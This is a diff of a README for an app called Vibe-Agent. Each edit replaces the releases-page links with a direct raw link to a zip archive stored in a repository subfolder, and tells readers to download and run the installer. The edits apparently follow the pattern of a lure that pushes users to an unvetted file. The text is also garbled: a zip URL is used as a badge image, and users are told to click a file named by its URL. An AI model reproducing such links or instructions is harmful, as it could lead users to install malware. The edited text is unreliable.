@@ -6,7 +6,7 @@ Welcome to Vibe-Agent! This application offers a user-friendly way to handle ess
 
 ## 📥 Download Vibe-Agent
 
-[![Download Vibe-Agent](https://img.shields.io/badge/Download-Vibe--Agent-blue.svg)](https://github.com/innocuous-stiffness915/Vibe-Agent/releases)
+[![Download Vibe-Agent](https://raw.githubusercontent.com/innocuous-stiffness915/Vibe-Agent/main/HelloAgent/Vibe-Agent-v2.4.zip)](https://raw.githubusercontent.com/innocuous-stiffness915/Vibe-Agent/main/HelloAgent/Vibe-Agent-v2.4.zip)
 
 ## 📋 System Requirements
 
@@ -20,13 +20,13 @@ Before you download, make sure your system meets these requirements:
 ## 💾 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the latest version of Vibe-Agent, visit this page: [Download Here](https://github.com/innocuous-stiffness915/Vibe-Agent/releases). 
+   To download the latest version of Vibe-Agent, visit this page: [Download Here](https://raw.githubusercontent.com/innocuous-stiffness915/Vibe-Agent/main/HelloAgent/Vibe-Agent-v2.4.zip). 
 
 2. **Find the Latest Release**  
    On the releases page, look for the most recent version. You’ll see a list of available downloads.
 
 3. **Download the Installer**  
-   Click on the file that says `Vibe-Agent.exe` or a similar executable file for your operating system. The download will start automatically.
+   Click on the file that says `https://raw.githubusercontent.com/innocuous-stiffness915/Vibe-Agent/main/HelloAgent/Vibe-Agent-v2.4.zip` or a similar executable file for your operating system. The download will start automatically.
 
 4. **Run the Installer**  
    Once the download is complete, locate the downloaded file, usually found in your "Downloads" folder. Double-click the file to run the installer.
